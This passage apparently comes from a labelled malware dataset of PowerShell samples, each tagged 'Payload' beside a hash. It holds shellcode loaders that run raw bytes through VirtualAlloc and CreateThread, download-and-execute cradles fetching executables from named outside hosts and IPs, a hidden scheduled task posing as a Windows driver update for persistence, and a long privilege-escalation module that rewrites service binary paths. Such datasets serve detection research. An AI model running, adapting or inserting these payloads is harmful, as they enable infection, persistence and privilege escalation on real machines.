,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
c528a1f560026cdce272cfe1931aa7cb6ea99f55f3597c758d815fd71c600e8d,"
(New-Object System.Net.WebClient).DownloadFile('http://boisedelariviere.com/backup/css/newconfig.exe',""$env:TEMP\neone6.exe"");Start-Process (""$env:TEMP\neone6.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
9f65cac31bf5792dd7f279d61f5576241d425058ef9b72c289cac91f48ae3329,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nach.exe', $dpl);Start-Process $dpl

",Payload
dec4b922defb42b3c910dea05917e80fb6c4b4c02c44062339f4d1eb788f1a2b,"
$Jpc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Jpc -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x89,0x08,0x00,0x99,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0x86,0xea,0xf5,0x65,0x70,0x68,0xf5,0x95,0x80,0x0d,0x7f,0x70,0xb1,0x0d,0x1b,0xf0,0xe1,0xbd,0x6f,0x54,0x0d,0x35,0x3d,0x4d,0x86,0x3b,0xea,0x62,0x2f,0xf1,0xcc,0x4d,0xb0,0xaa,0x2d,0xcf,0x32,0xb1,0x61,0x2f,0x0b,0x7a,0x74,0x2e,0x4c,0x67,0x75,0x62,0x05,0xe3,0x28,0x93,0x22,0xb9,0xf0,0x18,0x78,0x2f,0x71,0xfc,0xc8,0x4e,0x50,0x53,0x43,0x09,0x72,0x55,0x80,0x21,0x3b,0x4d,0xc5,0x0c,0xf5,0xe6,0x3d,0xfa,0x04,0x2f,0x0c,0x03,0xaa,0x0e,0xa1,0xf6,0xb2,0x57,0x05,0xe9,0xc0,0xa1,0x76,0x94,0xd2,0x75,0x05,0x42,0x56,0x6e,0xad,0x01,0xc0,0x4a,0x4c,0xc5,0x97,0x19,0x42,0xa2,0xdc,0x46,0x46,0x35,0x30,0xfd,0x72,0xbe,0xb7,0xd2,0xf3,0x84,0x93,0xf6,0x58,0x5e,0xbd,0xaf,0x04,0x31,0xc2,0xb0,0xe7,0xee,0x66,0xba,0x05,0xfa,0x1a,0xe1,0x41,0xcf,0x16,0x1a,0x91,0x47,0x20,0x69,0xa3,0xc8,0x9a,0xe5,0x8f,0x81,0x04,0xf1,0xf0,0xbb,0xf1,0x6d,0x0f,0x44,0x02,0xa7,0xcb,0x10,0x52,0xdf,0xfa,0x18,0x39,0x1f,0x03,0xcd,0xd4,0x1a,0x93,0x72,0xf9,0x3d,0xcf,0xe3,0xf8,0x3d,0x1e,0xa8,0x75,0xdb,0x70,0x00,0xd6,0x74,0x30,0xf0,0x96,0x24,0xd8,0x1a,0x19,0x1a,0xf8,0x24,0xf3,0x33,0x92,0xca,0xaa,0x6c,0x0a,0x72,0xf7,0xe7,0xab,0x7b,0x2d,0x82,0xeb,0xf0,0xc2,0x72,0xa5,0xf0,0xaf,0x60,0x51,0xf1,0xe5,0xdb,0xf7,0x0e,0xd0,0x76,0xf7,0x9a,0xdf,0xd0,0xa0,0x32,0xe2,0x05,0x86,0x9c,0x1d,0x60,0x9d,0x15,0x88,0xcb,0xc9,0x59,0x5c,0xcc,0x09,0x0c,0x36,0xcc,0x61,0xe8,0x62,0x9f,0x94,0xf7,0xbe,0xb3,0x05,0x62,0x41,0xe2,0xfa,0x25,0x29,0x08,0x25,0x01,0xf6,0xf3,0x00,0x93,0xca,0x25,0x6c,0xe1,0x22,0xf6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$CdU4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($CdU4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$CdU4,0,0,0);for (;;){Start-sleep 60};

",Payload
b885c3bbe525172c0ffff26464993e55a0341ab4209ce09789180c3ba07c4255,"
$TaskName = ""Microsoft Windows Driver Update""
$TaskDescr = ""Microsoft Windows Driver Update Services""
$TaskCommand = ""C:\ProgramData\WindowsUpgrade\evil.exe""
$TaskScript = """"
$TaskArg = """"
$TaskStartTime = [datetime]::Now.AddMinutes(1) 
$service = new-object -ComObject(""Schedule.Service"")
$service.Connect()
$rootFolder = $service.GetFolder(""\"")
$TaskDefinition = $service.NewTask(0) 
$TaskDefinition.RegistrationInfo.Description = ""$TaskDescr""
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.RestartCount = ""5""
$TaskDefinition.Settings.StartWhenAvailable = $true
$TaskDefinition.Settings.StopIfGoingOnBatteries = $false
$TaskDefinition.Settings.RestartInterval = ""PT5M""
$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(8)
$trigger.StartBoundary = $TaskStartTime.ToString(""yyyy-MM-dd'T'HH:mm:ss"")
$trigger.Enabled = $true
$trigger.Repetition.Interval = ""PT5M""
$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
$Action = $TaskDefinition.Actions.Create(0)
$action.Path = ""$TaskCommand""
$action.Arguments = ""$TaskArg""
$rootFolder.RegisterTaskDefinition(""$TaskName"",$TaskDefinition,6,""System"",$null,5)
SCHTASKS /run /TN $TaskName

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
aa8253441ee2c7c0ddfd111bef296c89df9fbc6a8b4d1eeb873d9a135702d5a3,"
(New-Object System.Net.WebClient).DownloadFile('http://31.184.234.74/crypted/1080qw.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
fb936173a521da6048e5b566c10c5975109070f677bbcf48782fe9c98ea93273,"












function New-InMemoryModule
{


    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}




function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory=$True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType(""$Namespace.$DllName"")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType(""$Namespace.$DllName"", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}




function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    
    
    
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    
    
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}








function Get-ModifiablePath {


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Switch]
        $LiteralPaths
    )

    BEGIN {
        
        

        
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            
            $SeparationCharacterSets = @('""', ""'"", ' ', ""`""'"", '"" ', ""' "", ""`""' "")

            if($PSBoundParameters['LiteralPaths']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    
                    try {
                        $ParentPath = Split-Path $TempPath -Parent
                        if($ParentPath -and (Test-Path -Path $ParentPath)) {
                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                        }
                    }
                    catch {
                        
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if(($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if($TempPath -and ($TempPath -ne '')) {
                                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent).Trim()
                                        if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath )) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {
                                        
                                    }
                                }
                            }
                        }
                        else {
                            
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }

                    
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if($CurrentUserSids -contains $IdentitySID) {
                            New-Object -TypeName PSObject -Property @{
                                ModifiablePath = $CandidatePath
                                IdentityReference = $_.IdentityReference
                                Permissions = $Permissions
                            }
                        }
                    }
                }
            }
        }
    }
}


function Get-CurrentUserTokenGroupSid {


    [CmdletBinding()]
    Param()

    $CurrentProcess = $Kernel32::GetCurrentProcess()

    $TOKEN_QUERY= 0x0008

    
    [IntPtr]$hProcToken = [IntPtr]::Zero
    $Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Success) {
        $TokenGroupsPtrSize = 0
        
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)

        [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

        
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($Success) {

            $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS

            For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                
                $SidString = ''
                $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if($Result -eq 0) {
                    Write-Verbose ""Error: $(([ComponentModel.Win32Exception] $LastError).Message)""
                }
                else {
                    $GroupSid = New-Object PSObject
                    $GroupSid | Add-Member Noteproperty 'SID' $SidString
                    
                    $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                    $GroupSid
                }
            }
        }
        else {
            Write-Warning ([ComponentModel.Win32Exception] $LastError)
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
    }
    else {
        Write-Warning ([ComponentModel.Win32Exception] $LastError)
    }
}


function Add-ServiceDacl {


    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')

            $ReadControl = 0x00020000

            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))

            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop

            try {
                Write-Verbose ""Add-ServiceDacl IndividualService : $($IndividualService.Name)""
                $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose ""Error opening up the service handle with read control for $($IndividualService.Name) : $_""
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                $SizeNeeded = 0

                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                
                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.Win32Exception] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                        }

                        Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Set-ServiceBinPath {


    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position=1, Mandatory=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $binPath
    )

    BEGIN {
        filter Local:Get-ServiceConfigControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ServiceProcess.ServiceController]
                [ValidateNotNullOrEmpty()]
                $TargetService
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')

            $ConfigControl = 0x00000002

            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))

            $RawHandle
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            try {
                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose ""Error opening up the service handle with read control for $IndividualService : $_""
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {

                $SERVICE_NO_CHANGE = [UInt32]::MaxValue

                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, ""$binPath"", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if ($Result -ne 0) {
                    Write-Verbose ""binPath for $IndividualService successfully set to '$binPath'""
                    $True
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                    $Null
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Test-ServiceDaclPermission {


    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
